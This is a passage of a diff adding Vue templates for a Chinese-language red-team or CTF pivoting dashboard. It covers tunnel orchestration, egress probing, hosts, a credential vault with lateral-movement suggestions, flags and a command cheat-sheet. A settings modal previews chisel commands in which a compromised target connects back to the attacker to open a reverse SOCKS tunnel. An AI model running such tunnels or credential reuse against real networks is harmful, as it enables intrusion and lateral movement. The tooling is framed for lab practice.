+          <h3>② 部署指令</h3>
+          <div class="row-gap">
+            <span class="badge" :class="compose.autoDeploy ? 'badge-warn' : 'badge-info'">{{ compose.autoDeploy ? '自动档' : '半自动档' }}</span>
+            <span class="badge" :class="detect.done ? 'badge-ok' : 'badge-idle'">
+              {{ detect.done ? '探测：' + detect.recommend.split('（')[0] : '未探测' }}
+            </span>
+            <button class="btn btn-xs" @click="ui.modal = 'probe'">查看探测</button>
+          </div>
+        </div>
+
+        <!-- 分步执行（多级场景一目了然） -->
+        <div class="hops" v-if="compose.hops.length">
+          <div class="hop" v-for="(h, i) in compose.hops" :key="i">
+            <div class="hop-no">{{ i + 1 }}</div>
+            <div class="hop-body">
+              <div class="hop-head">
+                <b>{{ h.role }}</b>
+                <span class="mono muted">{{ ipOf(h.hostId) }}</span>
+              </div>
+              <pre class="code-block code-xs"><code>{{ h.cmd }}</code></pre>
+              <div class="hop-foot">
+                <button class="btn btn-xs" @click="copy(h.cmd)">复制</button>
+                <button class="btn btn-xs" @click="sendHop(h)">发送到该节点终端</button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="cmd-tabs">
+          <button class="tab" :class="{ 'is-active': compose.tab === 'server' }" @click="compose.tab = 'server'">攻击机命令</button>
+          <button class="tab" :class="{ 'is-active': compose.tab === 'target' }" @click="compose.tab = 'target'">跳板机命令</button>
+          <button class="tab" :class="{ 'is-active': compose.tab === 'chain' }" @click="compose.tab = 'chain'">链路说明</button>
+        </div>
+        <pre class="code-block code-tall"><code>{{ compose.tab === 'server' ? compose.serverConf : compose.tab === 'target' ? compose.targetCmd : compose.chainConf }}</code></pre>
+        <div class="row-gap row-right">
+          <button class="btn btn-sm" @click="copy(compose.tab === 'server' ? compose.serverConf : compose.tab === 'target' ? compose.targetCmd : compose.chainConf)">复制</button>
+          <button class="btn btn-sm" @click="sendToTerminal()">发送到虚拟终端</button>
+        </div>
+
+        <!-- 工具联动配置 -->
+        <div class="panel-sub" v-if="proxy.msf">
+          <div class="panel-sub-head"><b>msfconsole route 片段</b><button class="btn btn-xs" @click="copy(proxy.msf)">复制</button></div>
+          <pre class="code-block code-sm"><code>{{ proxy.msf }}</code></pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- ③ 统一入口 + 健康 -->
+    <div class="panel">
+      <div class="panel-head">
+        <h3>③ 统一入口与健康看板</h3>
+        <div class="row-gap">
+          <span class="muted tiny">共 {{ links.length }} 条链路，{{ aliveCount }} 条存活</span>
+          <button class="btn btn-xs" @click="checkAll()">全部健康检查</button>
+        </div>
+      </div>
+      <div class="table-wrap">
+        <table class="table">
+          <thead>
+            <tr>
+              <th>状态</th><th>工具</th><th>类型</th><th>入口 → 出口</th><th>本地入口</th><th>覆盖范围</th>
+              <th>延迟</th><th>流量</th><th style="width:170px">操作</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr v-for="l in links" :key="l.id">
+              <td><span class="dot" :class="l.status === 'alive' ? 'is-on' : l.status === 'error' ? 'is-err' : 'is-off'"></span></td>
+              <td><span class="badge badge-info">{{ l.tool }}</span></td>
+              <td>
+                <span class="badge" :class="l.linkType === 'portfwd' ? 'badge-warn' : l.linkType === 'relay' ? 'badge-err' : 'badge-ok'">
+                  {{ l.linkType === 'portfwd' ? '端口转发' : l.linkType === 'relay' ? '多级中继' : 'Socks' }}
+                </span>
+              </td>
+              <td class="mono">{{ ipOf(l.fromHostId) }} → {{ ipOf(l.toHostId) }}</td>
+              <td class="mono text-accent">{{ l.localSocks || '-' }}</td>
+              <td class="mono">{{ l.targetHost ? l.targetHost + ':' + l.targetPort : (l.targetSegment || '-') }}</td>
+              <td class="mono">{{ l.status === 'alive' ? l.latency + 'ms' : '—' }}</td>
+              <td class="mono muted">{{ l.traffic || '0 B' }}</td>
+              <td>
+                <button class="btn btn-xs" @click="check(l.id)">检查</button>
+                <button class="btn btn-xs" @click="restart(l.id)">重拉</button>
+                <button class="btn btn-xs btn-danger" @click="stop(l.id)">销毁</button>
+                <button class="btn btn-xs btn-ghost" @click="remove(l.id)">删除</button>
+              </td>
+            </tr>
+            <tr v-if="!links.length"><td colspan="9" class="empty-cell">暂无代理链路</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- 出网探测弹窗 -->
+    <div class="modal-mask" v-if="ui.modal === 'probe'" @click.self="ui.modal = null">
+      <div class="modal modal-probe">
+        <div class="modal-head">
+          <h3>
+            <svg class="ico" viewBox="0 0 24 24" v-html="icon('radar')"></svg>
+            出网探测 · <span class="mono">{{ ipOf(compose.fromHostId) }}</span>
+            <span class="muted tiny">{{ hostOf(compose.fromHostId) ? hostOf(compose.fromHostId).hostname : '' }}</span>
+          </h3>
+          <button class="icon-btn" @click="ui.modal = null">×</button>
+        </div>
+
+        <div class="modal-body">
+          <p class="muted tiny">
+            通过该跳板机执行 ICMP / DNS / HTTP / TCP 四类出站测试，判断它能把流量送出到哪里，据此决定隧道选型。
+          </p>
+
+          <div class="probe-grid">
+            <div class="probe-item" v-for="p in detect.probes" :key="p.key" :class="'is-' + p.state">
+              <div class="probe-item-k mono">{{ p.key }}</div>
+              <div class="probe-item-bar"><i :style="{ width: p.progress + '%' }"></i></div>
+              <div class="probe-item-s">
+                <b>{{ p.state === 'ok' ? '可达' : p.state === 'fail' ? '阻断' : p.state === 'run' ? '探测中…' : '待测' }}</b>
+                <span class="muted mono" v-if="p.ms">{{ p.ms }}ms</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="probe-result" v-if="detect.done">
+            <div class="res-line"><span>结论</span><b>{{ detect.verdict }}</b></div>
+            <div class="res-line"><span>推荐隧道</span><b class="text-ok">{{ detect.recommend }}</b></div>
+            <div class="res-line" v-if="detect.alt"><span>备选</span><b>{{ detect.alt }}</b></div>
+            <p class="muted tiny">{{ detect.reason }}</p>
+          </div>
+          <div class="callout" v-else>
+            <b>探测进行中…</b>
+            <p class="muted tiny">四类探针全部完成后会给出隧道选型建议。</p>
+          </div>
+        </div>
+
+        <div class="modal-foot">
+          <span class="grow muted tiny" v-if="detect.done">结果会同步到操作时间线</span>
+          <button class="btn" :disabled="detect.running" @click="runDetect()">重新探测</button>
+          <button class="btn btn-primary" v-if="detect.done" @click="applyRecommend()">使用推荐工具</button>
+          <button class="btn btn-primary" v-else @click="ui.modal = null">关闭</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- 攻击机网络设置弹窗 -->
+    <div class="modal-mask" v-if="ui.modal === 'attack-cfg'" @click.self="ui.modal = null">
+      <div class="modal">
+        <div class="modal-head">
+          <h3>
+            <svg class="ico" viewBox="0 0 24 24" v-html="icon('server')"></svg>
+            攻击机网络设置
+          </h3>
+          <button class="icon-btn" @click="ui.modal = null">×</button>
+        </div>
+        <div class="modal-body form-stack">
+          <p class="muted tiny">攻击机通过 VPN 接入靶场网络时，靶机必须回连到本机在该网络中的地址；写成 <code>127.0.0.1</code> 会导致回连失败。</p>
+          <div class="form-row">
+            <label class="field">
+              <span>本机在靶场网络的 IP</span>
+              <input class="input mono" v-model="compose.attackIp" placeholder="如 10.0.0.5" />
+            </label>
+            <label class="field">
+              <span>隧道监听端口</span>
+              <input class="input mono" v-model.number="compose.attackPort" />
+            </label>
+          </div>
+          <div class="form-row">
+            <label class="field">
+              <span>网卡 / 接口</span>
+              <input class="input mono" v-model="attackIface" placeholder="如 tun0 / WLAN" />
+            </label>
+            <label class="field">
+              <span>所在网段</span>
+              <input class="input mono" v-model="attackSegment" placeholder="如 10.0.0.0/24" />
+            </label>
+          </div>
+          <div class="callout">
+            <b>命令预览</b>
+            <p class="muted tiny mono">攻击机监听：./chisel server -p {{ compose.attackPort }} --reverse</p>
+            <p class="muted tiny mono">靶机回连：./chisel client {{ compose.attackIp }}:{{ compose.attackPort }} R:0.0.0.0:{{ compose.localPort }}:socks</p>
+          </div>
+          <div class="callout" v-if="attack">
+            <b>当前生效值</b>
+            <p class="muted tiny mono">{{ attack.ip }} · {{ attack.segment }} · {{ attack.iface }}</p>
+          </div>
+        </div>
+        <div class="modal-foot">
+          <button class="btn" @click="ui.modal = null">取消</button>
+          <button class="btn btn-primary" @click="saveAttack()">保存并刷新命令</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- 代理工具设置弹窗（MS4：仅 chisel 已接入，其余为下线状态） -->
+    <div class="modal-mask" v-if="ui.modal === 'tools-cfg'" @click.self="ui.modal = null">
+      <div class="modal modal-tools">
+        <div class="modal-head">
+          <h3>
+            <svg class="ico" viewBox="0 0 24 24" v-html="icon('settings')"></svg>
+            代理工具设置
+          </h3>
+          <button class="icon-btn" @click="ui.modal = null">×</button>
+        </div>
+        <div class="modal-body form-stack">
+          <div class="tool-summary">
+            <span class="dot is-on"></span>
+            <span>已启用 <b class="text-ok">{{ toolCfg.list.filter(t => t.enabled).length }}</b> / {{ toolCfg.list.length }}</span>
+            <span class="muted tiny">只有已启用的工具会出现在编排台的「隧道工具」下拉里</span>
+          </div>
+          <div class="tool-grid">
+            <div class="tool-card" v-for="t in toolCfg.list" :key="t.name"
+                 :class="t.status === 'online' ? (t.enabled ? 'is-on' : 'is-ready') : 'is-off'">
+              <div class="tool-card-head">
+                <span class="dot" :class="t.status === 'online' ? 'is-on' : 'is-off'"></span>
+                <b>{{ t.name }}</b>
+                <span class="badge" :class="t.status === 'online' ? 'badge-ok' : 'badge-warn'">{{ t.status === 'online' ? '已支持' : '下线' }}</span>
+              </div>
+              <p class="tool-card-note">{{ t.note }}</p>
+              <div class="tool-card-foot">
+                <div class="tool-tags">
+                  <span class="tool-tag">{{ t.type }}</span>
+                  <span class="tool-tag" v-for="s in t.supports" :key="s">{{ s }}</span>
+                </div>
+                <label class="toggle" :class="{ 'is-disabled': t.status !== 'online' }"
+                       :title="t.status === 'online' ? '' : '适配器尚未接入，暂不可启用'">
+                  <input type="checkbox" :checked="t.enabled" :disabled="t.status !== 'online'" @change="toggleTool(t)" />
+                  <i class="toggle-track"><i class="toggle-knob"></i></i>
+                  <span class="toggle-label">{{ t.enabled ? '启用' : '未启用' }}</span>
+                </label>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="modal-foot">
+          <button class="btn" @click="ui.modal = null">取消</button>
+          <button class="btn btn-primary" :disabled="toolCfg.saving" @click="saveToolSettings()">{{ toolCfg.saving ? '保存中…' : '保存' }}</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</script>
+
+<!-- ============================= 模板：资产 ============================= -->
+<script type="text/x-template" id="tpl-asset">
+  <div class="view view-asset">
+    <div class="view-head">
+      <div>
+        <h2>资产列表</h2>
+        <p class="muted">IP / 主机名 / OS / 开放服务 / 当前权限 / 层级 / 备注 · 支持手动登记、Shell 回传自动入库与移除</p>
+      </div>
+      <div class="view-head-actions">
+        <input class="input input-sm" v-model="filter" placeholder="搜索 IP / 主机名 / 服务" style="width:220px" />
+        <select class="input input-sm" v-model="layerFilter" style="width:120px">
+          <option value="">全部层级</option>
+          <option v-for="l in layers" :key="l" :value="l">{{ l }}</option>
+        </select>
+        <button class="btn btn-sm" @click="importScan()">导入扫描结果</button>
+        <button class="btn btn-sm btn-primary" @click="openAdd()">登记主机</button>
+      </div>
+    </div>
+
+    <div class="stat-strip">
+      <div class="stat-card"><span>主机总数</span><b class="mono">{{ hosts.length }}</b></div>
+      <div class="stat-card"><span>已控</span><b class="mono text-ok">{{ ownedCount }}</b></div>
+      <div class="stat-card"><span>网段</span><b class="mono">{{ segments.length }}</b></div>
+      <div class="stat-card"><span>开放服务</span><b class="mono">{{ serviceCount }}</b></div>
+      <div class="stat-card"><span>最高权限主机</span><b class="mono text-warn">{{ rootCount }}</b></div>
+    </div>
+
+    <div class="table-wrap">
+      <table class="table">
+        <thead>
+          <tr>
+            <th>IP</th><th>主机名</th><th>OS</th><th>层级</th><th>网段</th><th>开放服务</th><th>权限</th><th>Shell</th><th>Flag</th><th>备注</th><th style="width:170px">操作</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr v-for="h in filtered" :key="h.id">
+            <td class="mono">
+              <span class="dot" :class="h.owned ? 'is-on' : 'is-off'"></span>{{ h.ip }}
+            </td>
+            <td>{{ h.hostname || '-' }}</td>
+            <td>{{ h.os }}</td>
+            <td><span class="badge badge-info">{{ h.layer }}</span></td>
+            <td class="mono muted">{{ h.segment }}</td>
+            <td class="mono">{{ (h.services || []).join(', ') || '-' }}</td>
+            <td :class="privClass(h.privilege)">{{ h.privilege || '—' }}</td>
+            <td class="mono">{{ shellsOf(h.id).length }}</td>
+            <td class="mono" :class="flagsOf(h.id).length ? 'text-ok' : 'muted'">{{ flagsOf(h.id).length }}</td>
+            <td class="muted ellipsis" :title="h.note">{{ h.note }}</td>
+            <td>
+              <button class="btn btn-xs" @click="focus(h)">定位</button>
+              <button class="btn btn-xs" @click="openCred(h.id)">凭据</button>
+              <button class="btn btn-xs btn-danger" @click="remove(h)">移除</button>
+            </td>
+          </tr>
+          <tr v-if="!filtered.length"><td colspan="11" class="empty-cell">没有匹配的主机</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="modal-mask" v-if="ui.modal === 'host-add'" @click.self="ui.modal = null">
+      <div class="modal">
+        <div class="modal-head"><h3>登记主机</h3><button class="icon-btn" @click="ui.modal = null">×</button></div>
+        <div class="modal-body form-grid">
+          <label class="field"><span>IP</span><input class="input mono" v-model="form.ip" placeholder="10.10.30.21" /></label>
+          <label class="field"><span>主机名</span><input class="input" v-model="form.hostname" /></label>
+          <label class="field"><span>操作系统</span><input class="input" v-model="form.os" placeholder="Linux / Windows Server 2019" /></label>
+          <label class="field"><span>层级</span><select class="input" v-model="form.layer"><option v-for="l in layers" :key="l">{{ l }}</option></select></label>
+          <label class="field"><span>网段</span><input class="input mono" v-model="form.segment" placeholder="10.10.30.0/24" /></label>
+          <label class="field"><span>当前权限</span><input class="input" v-model="form.privilege" placeholder="www-data / root / SYSTEM" /></label>
+          <label class="field field-full"><span>开放服务（逗号分隔）</span><input class="input mono" v-model="form.services" placeholder="22,80,3306" /></label>
+          <label class="field field-full"><span>备注</span><input class="input" v-model="form.note" /></label>
+        </div>
+        <div class="modal-foot">
+          <button class="btn" @click="ui.modal = null">取消</button>
+          <button class="btn btn-primary" @click="save()">保存并上拓扑</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="modal-mask" v-if="ui.modal === 'scan-import'" @click.self="ui.modal = null">
+      <div class="modal modal-wide">
+        <div class="modal-head"><h3>导入扫描结果</h3><button class="icon-btn" @click="ui.modal = null">×</button></div>
+        <div class="modal-body">
+          <p class="muted tiny">支持 nmap grepable / 内嵌扫描器 JSON。示例：</p>
+          <pre class="code-block code-sm"><code>{{ scanSample }}</code></pre>
+          <textarea class="input mono textarea-lg" v-model="scanText"></textarea>
+        </div>
+        <div class="modal-foot">
+          <span class="grow muted tiny">{{ scanPreview }}</span>
+          <button class="btn" @click="ui.modal = null">取消</button>
+          <button class="btn btn-primary" @click="doImport()">解析并入库</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</script>
+
+<!-- ============================= 模板：凭据 ============================= -->
+<script type="text/x-template" id="tpl-cred">
+  <div class="view view-cred">
+    <div class="view-head">
+      <div>
+        <h2>凭据库</h2>
+        <p class="muted">账号 / 密码 / 哈希 / 票据登记，标注来源主机与适用服务，自动做跨层复用推荐</p>
+      </div>
+      <div class="view-head-actions">
+        <input class="input input-sm" v-model="filter" placeholder="搜索账号 / 来源 / 服务" style="width:200px" />
+        <button class="btn btn-sm btn-primary" @click="openAdd()">登记凭据</button>
+      </div>
+    </div>
+
+    <div class="split">
+      <div class="split-main">
+        <div class="table-wrap">
+          <table class="table">
+            <thead>
+              <tr><th>账号</th><th>类型</th><th>凭据</th><th>来源主机</th><th>适用服务</th><th>复用</th><th>来源</th><th>时间</th><th style="width:140px">操作</th></tr>
+            </thead>
+            <tbody>
+              <tr v-for="c in filtered" :key="c.id" :class="{ 'is-selected': ui.selectedCredId === c.id }" @click="ui.selectedCredId = c.id">
+                <td class="mono">{{ c.username }}</td>
+                <td><span class="badge badge-info">{{ c.kind }}</span></td>
+                <td class="mono">{{ c.secret }}</td>
+                <td class="mono">{{ ipOf(c.hostId) }}</td>
+                <td class="mono">{{ (c.services || []).join(', ') }}</td>
+                <td><span class="badge" :class="c.reuse ? 'badge-warn' : 'badge-idle'">{{ c.reuse ? '可复用' : '未验证' }}</span></td>
+                <td class="muted">{{ c.source }}</td>
+                <td class="muted">{{ c.time }}</td>
+                <td>
+                  <button class="btn btn-xs" @click.stop="copy(c.secret)">复制</button>
+                  <button class="btn btn-xs" @click.stop="useOn(c)">横向尝试</button>
+                </td>
+              </tr>
+              <tr v-if="!filtered.length"><td colspan="9" class="empty-cell">暂无凭据</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <aside class="split-side">
+        <div class="panel">
+          <div class="panel-head"><h3>凭据复用推荐</h3></div>
+          <label class="field">
+            <span>目标主机</span>
+            <select class="input" v-model="targetHostId">
+              <option v-for="h in hosts" :key="h.id" :value="h.id">{{ h.ip }} · {{ h.os }}</option>
+            </select>
+          </label>
+          <div class="rec-list" v-if="recommendations.length">
+            <div class="rec-card" v-for="r in recommendations" :key="r.id">
+              <div class="rec-head">
+                <b class="mono">{{ r.username }}</b>
+                <span class="badge" :class="r.score >= 80 ? 'badge-ok' : r.score >= 50 ? 'badge-warn' : 'badge-idle'">{{ r.score }}% 匹配</span>
+              </div>
+              <div class="rec-meta muted tiny mono">{{ r.kind }} · 来源 {{ ipOf(r.hostId) }} · {{ (r.services || []).join(',') }}</div>
+              <div class="rec-reason muted tiny">{{ r.reason }}</div>
+              <button class="btn btn-xs btn-primary" @click="useOn(r, targetHostId)">用此凭据尝试横向</button>
+            </div>
+          </div>
+          <p class="muted tiny" v-else>该主机暂无同网段 / 同域可复用凭据。</p>
+        </div>
+        <div class="panel">
+          <div class="panel-head"><h3>统计</h3></div>
+          <div class="kv-grid">
+            <div><span>凭据总数</span><b class="mono">{{ creds.length }}</b></div>
+            <div><span>可复用</span><b class="mono text-warn">{{ reuseCount }}</b></div>
+            <div><span>已横向成功</span><b class="mono text-ok">{{ pwnedCount }}</b></div>
+          </div>
+        </div>
+      </aside>
+    </div>
+
+    <div class="modal-mask" v-if="ui.modal === 'cred-add'" @click.self="ui.modal = null">
+      <div class="modal">
+        <div class="modal-head"><h3>登记凭据</h3><button class="icon-btn" @click="ui.modal = null">×</button></div>
+        <div class="modal-body form-grid">
+          <label class="field"><span>账号</span><input class="input mono" v-model="form.username" /></label>
+          <label class="field"><span>类型</span><select class="input" v-model="form.kind"><option v-for="k in kinds" :key="k">{{ k }}</option></select></label>
+          <label class="field field-full"><span>密码 / 哈希 / 票据</span><input class="input mono" v-model="form.secret" /></label>
+          <label class="field"><span>来源主机</span><select class="input" v-model="form.hostId"><option v-for="h in hosts" :key="h.id" :value="h.id">{{ h.ip }}</option></select></label>
+          <label class="field"><span>适用服务（逗号分隔）</span><input class="input mono" v-model="form.services" placeholder="ssh,smb,rdp" /></label>
+          <label class="field field-full"><span>来源说明</span><input class="input" v-model="form.source" placeholder="如 config.php 明文 / SAM dump / 票据导出" /></label>
+        </div>
+        <div class="modal-foot">
+          <button class="btn" @click="ui.modal = null">取消</button>
+          <button class="btn btn-primary" @click="save()">保存</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</script>
+
+<!-- ============================= 模板：Flag ============================= -->
+<script type="text/x-template" id="tpl-flag">
+  <div class="view view-flag">
+    <div class="view-head">
+      <div>
+        <h2>Flag 收集墙</h2>
+        <p class="muted">按主机 / 阶段记录已拿 Flag，一键复制提交，看板展示完成度</p>
+      </div>
+      <div class="view-head-actions">
+        <button class="btn btn-sm btn-primary" @click="openAdd()">记录 Flag</button>
+      </div>
+    </div>
+
+    <div class="flag-top">
+      <div class="ring-card">
+        <div class="ring" :style="{ background: ringBg }">
+          <div class="ring-inner">
+            <b class="mono">{{ flags.length }}/{{ total }}</b>
+            <span class="muted tiny">已完成</span>
+          </div>
+        </div>
+        <div class="ring-legend">
+          <div><i class="swatch" style="background:var(--ok)"></i>已提交 {{ submitted }}</div>
+          <div><i class="swatch" style="background:var(--warn)"></i>待提交 {{ flags.length - submitted }}</div>
+          <div><i class="swatch" style="background:var(--border)"></i>未获取 {{ total - flags.length }}</div>
+        </div>
+      </div>
+      <div class="flag-stage">
+        <div class="stage-card" v-for="s in stages" :key="s.name">
+          <div class="stage-head"><b>{{ s.name }}</b><span class="muted mono">{{ s.got }}/{{ s.total }}</span></div>
+          <div class="progress"><i :style="{ width: s.total ? (s.got / s.total * 100) + '%' : '0%' }"></i></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="flag-wall">
+      <div class="flag-card" v-for="f in flags" :key="f.id" :class="{ 'is-submitted': f.submitted }">
+        <div class="flag-head">
+          <span class="badge badge-info">{{ f.stage }}</span>
+          <span class="badge" :class="f.submitted ? 'badge-ok' : 'badge-warn'">{{ f.submitted ? '已提交' : '待提交' }}</span>
+        </div>
+        <div class="flag-host mono">{{ ipOf(f.hostId) }} · {{ hostnameOf(f.hostId) }}</div>
+        <div class="flag-value mono">{{ f.value }}</div>
+        <div class="flag-foot">
+          <button class="btn btn-xs" @click="copy(f.value)">复制提交</button>
+          <button class="btn btn-xs" :class="f.submitted ? '' : 'btn-primary'" @click="f.submitted = !f.submitted">{{ f.submitted ? '撤销' : '标记已交' }}</button>
+        </div>
+      </div>
+      <div class="flag-card is-empty" @click="openAdd()">
+        <svg class="ico ico-lg" viewBox="0 0 24 24" v-html="icon('plus')"></svg>
+        <span>记录新 Flag</span>
+      </div>
+    </div>
+
+    <div class="modal-mask" v-if="ui.modal === 'flag-add'" @click.self="ui.modal = null">
+      <div class="modal">
+        <div class="modal-head"><h3>记录 Flag</h3><button class="icon-btn" @click="ui.modal = null">×</button></div>
+        <div class="modal-body form-grid">
+          <label class="field"><span>所属主机</span><select class="input" v-model="form.hostId"><option v-for="h in hosts" :key="h.id" :value="h.id">{{ h.ip }}</option></select></label>
+          <label class="field"><span>阶段</span><select class="input" v-model="form.stage"><option v-for="s in stageNames" :key="s">{{ s }}</option></select></label>
+          <label class="field field-full"><span>Flag 内容</span><input class="input mono" v-model="form.value" placeholder="flag{...}" /></label>
+          <label class="field field-full checkbox-line"><input type="checkbox" v-model="form.submitted" /><span>已提交到平台</span></label>
+        </div>
+        <div class="modal-foot">
+          <button class="btn" @click="ui.modal = null">取消</button>
+          <button class="btn btn-primary" @click="save()">保存</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</script>
+
+<!-- ============================= 模板：时间线 ============================= -->
+<script type="text/x-template" id="tpl-timeline">
+  <div class="view view-timeline">
+    <div class="view-head">
+      <div>
+        <h2>操作时间线</h2>
+        <p class="muted">自动事件（拿到 Shell / 拉起代理 / 发现主机 / 收集凭据 / 拿到 Flag）+ 手动笔记，可关联到主机节点</p>
+      </div>
+      <div class="view-head-actions">
+        <select class="input input-sm" v-model="kindFilter" style="width:150px">
+          <option value="">全部事件</option>
+          <option v-for="k in kinds" :key="k" :value="k">{{ kindLabel(k) }}</option>
+        </select>
+        <select class="input input-sm" v-model="hostFilter" style="width:150px">
+          <option value="">全部主机</option>
+          <option v-for="h in hosts" :key="h.id" :value="h.id">{{ h.ip }}</option>
+        </select>
+        <button class="btn btn-sm btn-primary" @click="openNote()">添加笔记</button>
+      </div>
+    </div>
+
+    <div class="timeline">
+      <div class="tl-item" v-for="e in filtered" :key="e.id">
+        <div class="tl-rail">
+          <i class="tl-dot" :class="'tl-' + e.kind"></i>
+        </div>
+        <div class="tl-body">
+          <div class="tl-head">
+            <span class="tl-time mono">{{ e.time }}</span>
+            <span class="badge" :class="'badge-' + kindBadge(e.kind)">{{ kindLabel(e.kind) }}</span>
+            <span class="tl-title">{{ e.title }}</span>
+            <span class="grow"></span>
+            <button v-if="e.hostId" class="btn btn-xs btn-ghost" @click="focusHost(e.hostId)">{{ ipOf(e.hostId) }}</button>
+          </div>
+          <div class="tl-detail" v-if="e.detail">{{ e.detail }}</div>
+          <pre class="code-block code-sm" v-if="e.cmd"><code>{{ e.cmd }}</code></pre>
+          <div class="tl-foot" v-if="e.markdown">
+            <div class="md" v-html="md(e.markdown)"></div>
+          </div>
+        </div>
+      </div>
+      <div class="tl-item" v-if="!filtered.length">
+        <div class="tl-rail"><i class="tl-dot"></i></div>
+        <div class="tl-body"><p class="muted">没有匹配的事件</p></div>
+      </div>
+    </div>
+
+    <div class="modal-mask" v-if="ui.modal === 'note-add'" @click.self="ui.modal = null">
+      <div class="modal">
+        <div class="modal-head"><h3>添加笔记</h3><button class="icon-btn" @click="ui.modal = null">×</button></div>
+        <div class="modal-body form-grid">
+          <label class="field field-full"><span>标题</span><input class="input" v-model="form.title" placeholder="如：L2 突破思路记录" /></label>
+          <label class="field"><span>关联主机</span>
+            <select class="input" v-model="form.hostId">
+              <option :value="''">不关联</option>
+              <option v-for="h in hosts" :key="h.id" :value="h.id">{{ h.ip }}</option>
+            </select>
+          </label>
+          <label class="field"><span>关联命令（可选）</span><input class="input mono" v-model="form.cmd" /></label>
+          <label class="field field-full"><span>内容（支持 Markdown）</span><textarea class="input textarea-lg" v-model="form.markdown"></textarea></label>
+        </div>
+        <div class="modal-foot">
+          <button class="btn" @click="ui.modal = null">取消</button>
+          <button class="btn btn-primary" @click="save()">保存到时间线</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</script>
+
+<!-- ============================= 模板：命令速查 ============================= -->
+<script type="text/x-template" id="tpl-cheat">
+  <div class="view view-cheat">
+    <div class="view-head">
+      <div>
+        <h2>红队命令速查库</h2>
+        <p class="muted">按场景分类的命令模板，支持变量替换（{IP} 自动填当前主机）与一键复制到虚拟终端</p>
+      </div>
+      <div class="view-head-actions">
+        <input class="input input-sm" v-model="q" placeholder="搜索命令 / 关键字" style="width:240px" />
+        <select class="input input-sm" v-model="ctxHostId" style="width:180px">
+          <option v-for="h in hosts" :key="h.id" :value="h.id">上下文主机：{{ h.ip }}</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="cheat-layout">
+      <aside class="cheat-cats">
+        <button class="nav-item" :class="{ 'is-active': cat === '' }" @click="cat = ''">全部命令 <span class="nav-badge mono">{{ commands.length }}</span></button>
+        <button v-for="c in categories" :key="c.name" class="nav-item" :class="{ 'is-active': cat === c.name }" @click="cat = c.name">
+          <svg class="ico" viewBox="0 0 24 24" v-html="icon(c.icon)"></svg>
+          <span class="nav-label">{{ c.name }}</span>
+          <span class="nav-badge mono">{{ c.count }}</span>
+        </button>
+      </aside>
+
+      <div class="cheat-list">
+        <div class="panel" v-for="c in filtered" :key="c.id">
+          <div class="panel-head">
+            <h3>{{ c.title }}</h3>
+            <div class="row-gap">
+              <span class="badge badge-info">{{ c.category }}</span>
+              <span class="badge" :class="'badge-' + (c.os === 'Windows' ? 'warn' : c.os === 'Linux' ? 'ok' : 'idle')">{{ c.os }}</span>
+              <button class="btn btn-xs" @click="copy(render(c.cmd))">复制</button>
+              <button class="btn btn-xs btn-primary" @click="run(c)">发送到终端</button>
+            </div>
+          </div>
+          <p class="muted tiny" v-if="c.note">{{ c.note }}</p>
+          <pre class="code-block code-sm"><code>{{ render(c.cmd) }}</code></pre>
+        </div>
+        <div class="panel" v-if="!filtered.length"><p class="muted">没有匹配的命令模板</p></div>
+      </div>
+    </div>
+  </div>
+</script>
+
+<!-- ============================= 模板：导出 ============================= -->
+<script type="text/x-template" id="tpl-export">
+  <div class="view view-export">
+    <div class="view-head">
+      <div>
+        <h2>复盘与导出</h2>
+        <p class="muted">以时间线为骨架 + 拓扑图快照 + 笔记，生成 Markdown Writeup 初稿 / HTML 交互报告 / JSON 原始数据</p>
+      </div>
+      <div class="view-head-actions">
+        <div class="seg">
+          <button v-for="f in formats" :key="f.key" class="seg-btn" :class="{ 'is-active': fmt === f.key }" @click="fmt = f.key">{{ f.label }}</button>
+        </div>
+        <button class="btn btn-sm" @click="copy(preview)">复制</button>
+        <button class="btn btn-sm btn-primary" @click="download()">导出下载</button>
+      </div>
+    </div>
+
+    <div class="export-grid">
+      <div class="panel">
+        <div class="panel-head"><h3>导出选项</h3></div>
+        <div class="form-stack">
+          <label class="field checkbox-line"><input type="checkbox" v-model="opt.topo" /><span>包含拓扑图快照（SVG / 内嵌图）</span></label>
+          <label class="field checkbox-line"><input type="checkbox" v-model="opt.timeline" /><span>包含完整操作时间线</span></label>
+          <label class="field checkbox-line"><input type="checkbox" v-model="opt.creds" /><span>包含凭据列表（明文）</span></label>
+          <label class="field checkbox-line"><input type="checkbox" v-model="opt.flags" /><span>包含 Flag 收集表</span></label>
+          <label class="field checkbox-line"><input type="checkbox" v-model="opt.placeholder" /><span>插入截图占位符</span></label>
+          <label class="field checkbox-line"><input type="checkbox" v-model="opt.chain" /><span>包含跳板链参数与命令回放</span></label>
+          <div class="callout">
+            <b>项目打包</b>
+            <p class="muted tiny">支持将项目 + 截图附件打包为 .zip，便于换机或分享复盘（M6-3）。</p>
+            <button class="btn btn-sm btn-block" @click="toast('已生成 pivothub-project.zip', 'ok')">打包项目</button>
+          </div>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="panel-head">
+          <h3>预览 · {{ currentFormat.label }}</h3>
+          <span class="badge badge-info mono">{{ sizeText }}</span>
+        </div>
+        <pre class="code-block code-tall">{{ preview }}</pre>
+      </div>
+    </div>
+  </div>
+</script>
+
+<!-- ============================= 模板：看板 ============================= -->
+<script type="text/x-template" id="tpl-dashboard">
+  <div class="view view-dashboard">
+    <div class="view-head">
+      <div>
+        <h2>阶段看板</h2>
+        <p class="muted">{{ project.name }} · 已控主机 / 层级深度 / Flag 进度 / 剩余时间</p>
+      </div>
+      <div class="view-head-actions">
